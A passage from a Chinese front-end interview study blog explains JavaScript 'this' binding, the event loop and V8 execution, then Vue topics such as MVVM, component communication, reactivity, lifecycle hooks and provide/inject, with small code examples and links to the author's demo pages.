function_">log</span>(<span class="hljs-variable language_">this</span>)<br>&#125;<br><br><span class="hljs-keyword">let</span> obj = &#123;<br>    <span class="hljs-attr">description</span>: <span class="hljs-string">&quot;I&#x27;m an object&quot;</span><br>&#125;<br><br>f.<span class="hljs-title function_">call</span>(obj) <span class="hljs-comment">//&#123;description: &quot;I&#x27;m an object&quot;&#125;</span><br>f.<span class="hljs-title function_">apply</span>(obj) <span class="hljs-comment">//&#123;description: &quot;I&#x27;m an object&quot;&#125;</span><br><span class="hljs-title function_">f</span>() <span class="hljs-comment">//Window &#123;0: global, window: Window, self:...&#125;</span><br><span class="hljs-keyword">let</span> newF = f.<span class="hljs-title function_">bind</span>(obj)<br><span class="hljs-title function_">newF</span>() <span class="hljs-comment">//&#123;description: &quot;I&#x27;m an object&quot;&#125;</span><br></code></pre></td></tr></table></figure></li><li><p>new绑定</p><p>利用new来调用构造函数的时候，JS会新创建一个对象，并且会把函数中的this绑定为这个新对象。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">echo</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">echo</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>)<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title function_">f</span>(<span class="hljs-string">&quot;instance&quot;</span>)<br>instance.<span class="hljs-title function_">echo</span>() <span class="hljs-comment">//f &#123; name: &#x27;instance&#x27;, echo: [Function: echo] &#125;</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="43-数据是如何存储的"><a class="markdownIt-Anchor" href="#43-数据是如何存储的"></a> 43. 数据是如何存储的？</h2><p>基本数据类型保存在栈中，引用数据类型保存在堆中。</p><blockquote><p>有一种特殊情况，如果是闭包中的基本数据类型，它也会保存在堆中。</p></blockquote><p>对应赋值操作，原型数据类型的数据直接完整地复制变量值，对象数据类型的值则是复制引用地址。</p><p>为什么不全部用栈来保存数据呢？因为栈除了有保存变量的功能外，它还有创建并切换函数上下文的功能，如果用栈来保存复杂的数据，那么切换上下文的开销会变得很大。</p><h2 id="45-描述一下-v8-执行一段js代码的过程"><a class="markdownIt-Anchor" href="#45-描述一下-v8-执行一段js代码的过程"></a> 45. 描述一下 V8 执行一段JS代码的过程？</h2><ol><li><p>解释器对源码进行词法分析和语法分析来生成抽象语法树<code>AST</code></p></li><li><p>解释器利用AST生成字节码</p><blockquote><p>字节码是介于AST 和 机器码之间的一种代码，但是与特定类型的机器码无关，字节码需要通过解释器将其转换为机器码然后执行。</p></blockquote><p>字节码仍然需要转化为机器码，但是我们可以不用一次性将所有得字节码转化为机器码，而是通过解释器逐行执行字节码，省去生成二进制文件的操作，大大降低了内存的压力。</p></li><li><p>由解释器逐行执行字节码，在遇到热点代码<code>Hot Spot Code</code>时启动编译器进行编译，生成对应机器码，以优化执行效率。</p><blockquote><p>字节码有两种被执行的方式，一种是通过解释器逐行解释，但是如果遇到循环的代码，解释器就要重复地去解释，浪费了很多地时间，所以JS不光可以解释字节码，还会在遇到热点代码时，调用编译器进行编译得到机器码，在之后再次遇到直接运行机器码，极大提升执行效率。</p><p>这种字节码根编译器和解释器结果的技术被叫做 即时编译 <code>just-in-time compilation JIT</code></p></blockquote></li></ol><h2 id="46-宏任务macrotask引入"><a class="markdownIt-Anchor" href="#46-宏任务macrotask引入"></a> 46. 宏任务(MacroTask)引入</h2><p>JS中所有的任务分为同步任务和异步任务。而异步任务可以分为宏任务和微任务。</p><p>宏任务包括，setTimeout, setInterval, DOM事件等，它的特点是在是两个宏任务之间会对页面进行重新渲染，使得宏任务能够和DOM任务进行有序的执行。</p><h2 id="47-微任务microtask引入"><a class="markdownIt-Anchor" href="#47-微任务microtask引入"></a> 47. 微任务(MicroTask)引入</h2><p>在宏任务内部会有一个微任务队列，当一个宏任务完成之后，如果它内部的微任务队列为空，它就会开始运行下一个宏任务，如果不为空，它就会将依次完成所有微任务，执行好后再去执行下一个宏任务。常见的微任务有<code>MutationObserver, Promise</code>, 等，V8的垃圾回收机制也是微任务。</p><blockquote><p>值得注意的是Promise里并非全部都是微任务，只是.then, .catch等回调函数才是异步的。</p></blockquote><h2 id="48-理解eventloop浏览器"><a class="markdownIt-Anchor" href="#48-理解eventloop浏览器"></a> 48. 理解EventLoop：浏览器</h2><p>EventLoop 就是在不断循环中处理宏任务与微任务的一个循环。</p><p>我们需要了解循环过程中，同步任务、宏任务和微任务的执行先后顺序，以下面这个代码为例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;script start&#x27;</span>); <span class="hljs-comment">//1</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;setTimeout&#x27;</span>); <span class="hljs-comment">//6</span><br>&#125;,<span class="hljs-number">0</span>);<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">resolve</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;promise1&#x27;</span>); <span class="hljs-comment">//2</span><br>    <span class="hljs-title function_">resolve</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;promise2&#x27;</span>); <span class="hljs-comment">//3</span><br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;promise then&#x27;</span>); <span class="hljs-comment">//5</span><br>&#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;script end&#x27;</span>); <span class="hljs-comment">//4</span><br></code></pre></td></tr></table></figure><p>我们现在来进行解释。</p><ol><li><p>首先将整段脚本作为第一个宏任务执行。</p></li><li><p>执行过程中将同步代码直接执行，宏任务进入宏任务队列，微任务进入微任务队列。</p><blockquote><p>console.log(“script start”) 是同步代码，直接执行，作为第一个输出，setTimeout是一个宏任务，加入宏任务队列。Promise的处理器函数(就是当作参数的哪个函数)中实际上也是同步代码，所以第二个和第三个输出的是promise1和promise2。Promise.then() 是一个微任务，会被加入微任务队列。最后那个console.log(“script end”) 也是一个同步代码，会被直接执行。</p></blockquote></li><li><p>当前宏任务执行完出队，检查微任务队列，如果有则直接执行，直到微任务队列为空。</p><blockquote><p>现在微任务队列有一个Promise.then的微任务，我们将它运行完毕，输出 promise then。</p></blockquote></li><li><p>执行浏览器UI线程的渲染工作</p></li><li><p>检查是否有Web Worker任务，有则工作</p></li><li><p>执行队首新的宏任务，回到2，依次循环，直到宏任务和微任务队列都为空。</p><blockquote><p>新的宏任务从宏任务队列中拿出来，现在只有一个宏任务了，即setTimeout。运行完毕后，宏任务和微任务队列都空了。</p></blockquote></li></ol><h2 id="50-nodejs-和-浏览器关于eventloop的主要区别"><a class="markdownIt-Anchor" href="#50-nodejs-和-浏览器关于eventloop的主要区别"></a> 50. nodejs 和 浏览器关于eventLoop的主要区别</h2><p>两者对主要的差别在于浏览器中的微任务是每个相应的宏任务执行的。而Node.js中微任务是在不同的阶段之间执行的。</p><blockquote><p>浏览器中的微任务为什么说是在相应的宏任务中执行的呢？因为微任务首先需要被加入到微任务队列，而加入的这个过程肯定发生在某个宏任务的过程中。所以微任务的执行就会发生在那个宏任务的末尾。</p></blockquote><h1 id="vue"><a class="markdownIt-Anchor" href="#vue"></a> Vue</h1><h2 id="1什么是mvvm"><a class="markdownIt-Anchor" href="#1什么是mvvm"></a> 1.什么是MVVM ？</h2><p>它是<code>Model-View-ViewModel</code>的缩写，它是一种设计思想。</p><ol><li><p>其中Model层代表数据模型，也可以在其中定义一些数据修改和操作的业务逻辑</p></li><li><p>View层代表UI，负责将数据模型转化为UI展现出来。</p></li><li><p>ViewModel则负责同步View和Model。</p></li><li><p>在MVVM中，View和Model没有直接的联系，而是通过ViewModel进行双向交互，从而实现View的变化会同步到Model上，Model的变化也会立即反映到View上。</p></li><li><p>ViewModel通过双向数据绑定把View和Model连接了起来，而View和Model之间的同步工作完全是自动的，无需人为干涉，开发者只需关注业务逻辑而不用手动操作DOM。</p></li></ol><h2 id="2mvvm和mvc区别它和其它框架jquery的区别是什么哪些场景适合"><a class="markdownIt-Anchor" href="#2mvvm和mvc区别它和其它框架jquery的区别是什么哪些场景适合"></a> 2.mvvm和mvc区别？它和其它框架（jquery）的区别是什么？哪些场景适合？</h2><p>MVC是<code>Model-View-Controller</code>的缩写。它和MVVM都是设计思想，MVVM实际上是MVC的改进版，即把Controller改进为了View-Model。</p><p>MVC中大量的DOM操作会影响页面的渲染性能，加载速度慢，影响用户体验，而ViewModel则避免了这种大量的DOM操作。</p><p>它和Jquery的区别是 mvvm不需要用户手动进行dom操作，mvvm实现了数据和视图的双向绑定，而且同步过程是完全自动的。</p><p>MVVM非常适合数据操作很多的场景。</p><blockquote><p>优秀的参考链接：<a href="https://segmentfault.com/a/1190000023497325">前端面试 vue 部分 (1)——谈谈你对 MVVM 的理解</a></p></blockquote><h2 id="3-组件之间的传值"><a class="markdownIt-Anchor" href="#3-组件之间的传值"></a> 3. 组件之间的传值？</h2><p>父组件向子组件传值：</p><ol><li><p>父组件在调用子组件时直接在子组件的标签里写属性。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">child</span> <span class="hljs-attr">:custom_attribute</span>=<span class="hljs-string">&quot;something&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">child</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>子组件写<code>props</code>属性表明哪些属性是从父组件传递过来的，然后在html模板里直接用即可。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> &#123;&#123; custom_attribute&#125;&#125; <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">props</span>: [<span class="hljs-string">&quot;custom_attribute&quot;</span>] <span class="hljs-comment">//从父组件哪里得到的</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><p>子组件向父组件传值：</p><ol><li><p>子组件设置<code>emits</code>属性表示会向父组件传递哪些事件，然后在合适的地方调用事件。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;$emit(&#x27;custom_event&#x27;, &#x27;some_value&#x27;)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">emits</span>: [<span class="hljs-string">&#x27;custom_event&#x27;</span>]</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>值得注意的是<code>$emit</code>第一个参数代表自定义事件的名称，父组件可以通过<code>v-on:</code>来监听这个你自定义的事件，就像它是原生JS事件一样，然后<code>$emit</code>的第二个，第三个甚至更多的参数将可以用来给你这个自定义的事件传递参数。从而实现<strong>传值</strong>的目的。</p><p><a href="https://v3.cn.vuejs.org/api/instance-methods.html#emit">$emit官方文档</a></p></blockquote></li><li><p>父组件在子组件的标签上监听事件。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">child</span> @<span class="hljs-attr">custom_event</span>=<span class="hljs-string">&quot;handle_custom_event&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">child</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>值得注意的是custom_evnet的所有参数将会依次传给handle_custom_event函数。</p></blockquote></li></ol><p>我写了一个小页面，父组件就是App.vue，子组件里面就是一个img，然后父组件里有一个input输入框和一个回显框，在父组件里输入图片的url，这个url将通过props的方式传递给子组件，然后子组件将之设置为图片的src，然后子组件的图片在加载完毕或者加载失败后向父组件传递以后个自定义事件echo 让父组件在回显框里输出一些回显。</p><p>在线链接：<a href="https://wuuconix.github.io/static/vue-parent-child/">https://wuuconix.github.io/static/vue-parent-child/</a></p><p>页面源码：<a href="https://github.com/wuuconix/static/tree/main/vue-parent-child/src">https://github.com/wuuconix/static/tree/main/vue-parent-child/src</a></p><h2 id="4vue-双向绑定原理"><a class="markdownIt-Anchor" href="#4vue-双向绑定原理"></a> 4.Vue 双向绑定原理</h2><p><img src="https://static.vue-js.com/e5369850-3ac9-11eb-85f6-6fac77c0c9b3.png" alt="双向绑定" /></p><p>Vue双向绑定的主要原理可以概括为数据劫持 + 发布者-订阅者 的方法。</p><p>Vue的双向绑定主要依靠三大部件，Observer, Complie和Watcher。</p><p>Observer负责通过Object.defineProperty对属性进行劫持，设置相应属性的setter和getter。当相应数据发生变化后，会调用Dep.notify()通知数据的变化。</p><p>Complie负责对模板进行解析，包括模板指令和模板中的值，从而初始化视图，并且通过Watcher订阅数据变化，绑定更新函数。</p><p>Watcher则充当Observer和Complie之间的桥梁。当Observer发现属性被set或者get的时候，会调用Dep.notify()发起通知，Dep会调用所有订阅它的Watcher里的update方法，执行Complie绑定的回调函数，实现更新视图。</p><p>而MVVM作为数据绑定的入口，整合了Observer, Complie和Watcher三大部件。</p><h2 id="5-描述下-vue-从初始化页面修改数据刷新页面-ui-的过程"><a class="markdownIt-Anchor" href="#5-描述下-vue-从初始化页面修改数据刷新页面-ui-的过程"></a> 5. 描述下 vue 从初始化页面–修改数据–刷新页面 UI 的过程？</h2><p>初始化页面：首先Observer遍历所有属性，利用Object.defineProperty来劫持属性，设置相应的getter和setter。然后Complier负责解析模板指令，替换为数据，然后初始化视图，Complier会订阅一个Watcher来更新视图，此时Watcher会将自己添加到消息订阅器中，此时初始化完毕。</p><p>修改数据：当数据被修改时，会被Observer监听到，Oberser会调用Dep.notify() 来通知数据的变化，这是Dep会遍历它所有的订阅者，调用其update函数，Vue会根据内部的diff算法，patch相应的更新完成对视图的改变。</p><h2 id="6-你是如何理解-vue-的响应式系统的"><a class="markdownIt-Anchor" href="#6-你是如何理解-vue-的响应式系统的"></a> 6. 你是如何理解 Vue 的响应式系统的?</h2><ol><li><p>每个Vue组件都会有一个与之对应的Watcher实例。</p></li><li><p>Vue的data上的属性会被设置setter和getter。</p></li><li><p>当Vue component render函数被调用的时候，data会被touch，即被读，getter函数会被调用，此时vue会去记录此Vue component所依赖的所有data【这一个过程被叫做依赖收集】</p><blockquote><p>我的理解是形成了Dep对象。</p></blockquote></li><li><p>data被改用时，setter方法会被调用，此时vue会通知所有依赖此data的组件去调用它们的render函数进行更新。</p></li></ol><h2 id="7-虚拟-dom-实现原理"><a class="markdownIt-Anchor" href="#7-虚拟-dom-实现原理"></a> 7. 虚拟 DOM 实现原理</h2><ol><li><p>虚拟DOM是一种JavaScript对象，它是对真实DOM的抽象。</p></li><li><p>状态变更时，会调用Diff算法记录新数和旧树的差别。</p></li><li><p>最后把差异更新到真正的DOM</p></li></ol><blockquote><p>由于Diff算法的存在，会在最小限度内实现状态更新，最终的DOM操作可能会很少，比直接操作DOM的效率高上很多。</p></blockquote><h2 id="8-vue-中-key-值的作用"><a class="markdownIt-Anchor" href="#8-vue-中-key-值的作用"></a> 8. Vue 中 key 值的作用？</h2><blockquote><p><a href="https://v3.cn.vuejs.org/api/special-attributes.html#key">官方教程说明</a></p></blockquote><p>Vue中key的一种常见用法是在<code>v-for</code>中为每个虚拟节点设置一个标识，从而在虚拟DOM算法中起到提示的作用，可以提高虚拟DOM算法的效率。</p><p>还有一种使用场景是在你需要 不复用某个元素或者组件的时候，为组件设置一个key可以让它强制是一个新的元素或者组件。</p><h2 id="9-vue-的生命周期"><a class="markdownIt-Anchor" href="#9-vue-的生命周期"></a> 9. Vue 的生命周期</h2><p>Vue的声明周期主要分为八个阶段。</p><ol><li><p>beforeCreate</p><blockquote><p>vue实例的挂载元素el和数据对象data均为undefined</p></blockquote></li><li><p>created</p><blockquote><p>data已经初始化完成，el仍未被挂载。</p></blockquote></li><li><p>beforeMount</p></li><li><p>mounted</p><blockquote><p>el挂载完成</p></blockquote></li><li><p>beforeUpdate</p></li><li><p>updated</p></li><li><p>beforeUnmount</p></li><li><p>unmounted</p></li></ol><p>在第一次页面加载时会触发前4个钩子。</p><p>DOM渲染在mounted中完成。</p><p>这里我又写了一个小页面，它会在各个声明周期输入 <code>this.$data.src</code> 和 <code>this.$el</code>。方便我们查看各个声明周期中data和el的情况。</p><p>在线链接：<a href="https://wuuconix.github.io/static/lifecycle/">https://wuuconix.github.io/static/lifecycle/</a></p><p>页面源码：<a href="https://github.com/wuuconix/static/tree/main/lifecycle/src">https://github.com/wuuconix/static/tree/main/lifecycle/src</a></p><p>以下是该页面在不同生命周期下的输出。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">beforeCreate <span class="hljs-keyword">this</span>.$<span class="hljs-keyword">data</span>: [<span class="hljs-keyword">object</span> Object]<br>beforeCreate <span class="hljs-keyword">this</span>.$<span class="hljs-keyword">data</span>.src: undefined<br>beforeCreate <span class="hljs-keyword">this</span>.$el: <span class="hljs-literal">null</span><br>created <span class="hljs-keyword">this</span>.$<span class="hljs-keyword">data</span>.src: https:<span class="hljs-comment">//conix.ml/</span><br>created <span class="hljs-keyword">this</span>.$el: <span class="hljs-literal">null</span><br>beforeMount <span class="hljs-keyword">this</span>.$el: <span class="hljs-literal">null</span><br>mounted <span class="hljs-keyword">this</span>.$el: [<span class="hljs-keyword">object</span> HTMLDivElement]<br>beforeUpdate <span class="hljs-keyword">this</span>.url: https:<span class="hljs-comment">//conix.ml/?random=0.18101375466910175</span><br>updated <span class="hljs-keyword">this</span>.url: https:<span class="hljs-comment">//conix.ml/?random=0.18101375466910175</span><br>beforeUnmount <span class="hljs-keyword">this</span>.$<span class="hljs-keyword">data</span>.src: https:<span class="hljs-comment">//conix.ml/?random=0.18101375466910175</span><br>beforeUnmount <span class="hljs-keyword">this</span>.$el: [<span class="hljs-keyword">object</span> HTMLDivElement]<br>unmounted <span class="hljs-keyword">this</span>.$<span class="hljs-keyword">data</span>.src: https:<span class="hljs-comment">//conix.ml/?random=0.18101375466910175</span><br>unmounted <span class="hljs-keyword">this</span>.$el: [<span class="hljs-keyword">object</span> HTMLDivElement]<br></code></pre></td></tr></table></figure><p>可以看到，在beforeCreate的时候，data作为一个对象已经存在了，但是我们定义的那些变量还没有形成，所以访问 <code>this.$data.src</code> 返回了undefined。</p><p>在beforeMount 包括之前，el一直是null，表示vye实例还没有挂载到某个DOM上。</p><p>值得注意的是 beforeUpdate 的时候，data实际上已经发生变化了，所以beforeUpdate和updated输出的src都是同一个，即新的src。</p><p>beforeUnmount和unmounted的测试结果令我吃惊，貌似在卸载后仍能得到data，并且这个vue实例貌似还能访问到el。</p><h2 id="10-vue-组件间通信有哪些方式"><a class="markdownIt-Anchor" href="#10-vue-组件间通信有哪些方式"></a> 10. Vue 组件间通信有哪些方式?</h2><ol><li><p>prop/$emit</p><blockquote><p>这个适合父子之间传递值。之前写过，参考<a href="#3-组件之间的传值" class="tocbot-link node-name--H2  tocbot-active-link">3. 组件之间的传值？</a></p></blockquote></li><li><p>eventBus 事件总线</p><blockquote><p>事件总线非常适合跨度非常大的祖先-后辈组件或者两个兄弟组件。它通过全局api来实现数据传递。</p><p>vue2中主要借助全局api $emit 和 $on。 而在vue3中把eventBus取缔了，如果还想使用类似的用法，可以使用mitt库。</p><p><a href="https://v3.cn.vuejs.org/guide/migration/events-api.html#%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF">官方文档</a></p><p>我写的小页面，利用了mitt库实现了事件总线的操作。</p><p>在线链接：<a href="https://wuuconix.github.io/static/eventBus/">https://wuuconix.github.io/static/eventBus/</a></p><p>页面源码：<a href="https://github.com/wuuconix/static/tree/main/eventBus/src">https://github.com/wuuconix/static/tree/main/eventBus/src</a></p></blockquote></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>t</mi><mi>t</mi><mi>r</mi><mi>s</mi><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">attrs/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord">/</span></span></span></span>listeners</p><blockquote><p>vue3中已经取消了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>n</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>a</mi><mi>p</mi><mi>i</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">因</mi><mi mathvariant="normal">为</mi></mrow><annotation encoding="application/x-tex">listeners api。因为</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">a</span><span class="mord mathdefault">p</span><span class="mord mathdefault">i</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span></span></span></span>attrs中也可以传递事件方法了。</p><p>这种方法也只适合父子组件之间的传值。因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>t</mi><mi>t</mi><mi>r</mi><mi>s</mi><mi mathvariant="normal">包</mi><mi mathvariant="normal">含</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">量</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">父</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">调</mi><mi mathvariant="normal">用</mi><mi mathvariant="normal">子</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">标</mi><mi mathvariant="normal">签</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">面</mi><mi mathvariant="normal">所</mi><mi mathvariant="normal">有</mi><mi mathvariant="normal">设</mi><mi mathvariant="normal">置</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">属</mi><mi mathvariant="normal">性</mi><mi mathvariant="normal">【</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">去</mi><mi mathvariant="normal">除</mi><mi mathvariant="normal">掉</mi><mi mathvariant="normal">子</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">设</mi><mi mathvariant="normal">置</mi><mi mathvariant="normal">的</mi><mi>p</mi><mi>r</mi><mi>o</mi><mi>p</mi><mi>s</mi><mi mathvariant="normal">属</mi><mi mathvariant="normal">性</mi><mi mathvariant="normal">】</mi><mi mathvariant="normal">，</mi></mrow><annotation encoding="application/x-tex">attrs包含的变量是 父组件调用子组件标签里面所有设置的属性【会去除掉子组件设置的props属性】，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">包</span><span class="mord cjk_fallback">含</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">父</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">签</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">设</span><span class="mord cjk_fallback">置</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">属</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">【</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">去</span><span class="mord cjk_fallback">除</span><span class="mord cjk_fallback">掉</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">设</span><span class="mord cjk_fallback">置</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault">p</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">属</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">】</span><span class="mord cjk_fallback">，</span></span></span></span>attrs 还可以包含事件，而普通的props操作貌似只能传递属性，$attrs的作用更大些。</p><p>在线链接：<a href="https://wuuconix.github.io/static/$attrs/">https://wuuconix.github.io/static/$attrs/</a></p><p>页面源码：<a href="https://github.com/wuuconix/static/tree/main/$attrs/src">https://github.com/wuuconix/static/tree/main/$attrs/src</a></p></blockquote></li><li><p>provide/inject</p><blockquote><p>这种方法非常好，适合跨代的祖先-后代组件，但是不适用于兄弟组件</p><p>它的使用方法是在一个组件组件里provide一个变量，然后在某个后代组件后inject后，这个变量就会变成后代组件的一个属性可以使用了。</p><p>在线链接：<a href="https://wuuconix.github.io/static/provide-inject/">https://wuuconix.github.io/static/provide-inject/</a></p><p>页面源码：<a href="https://github.com/wuuconix/static/tree/main/provide-inject/src">https://github.com/wuuconix/static/tree/main/provide-inject/src</a></p></blockquote></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>a</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">parent/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord">/</span></span></span></span>children 与 ref</p><blockquote><p>vue3中已经将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>h</mi><mi>i</mi><mi>l</mi><mi>d</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi mathvariant="normal">方</mi><mi mathvariant="normal">法</mi><mi 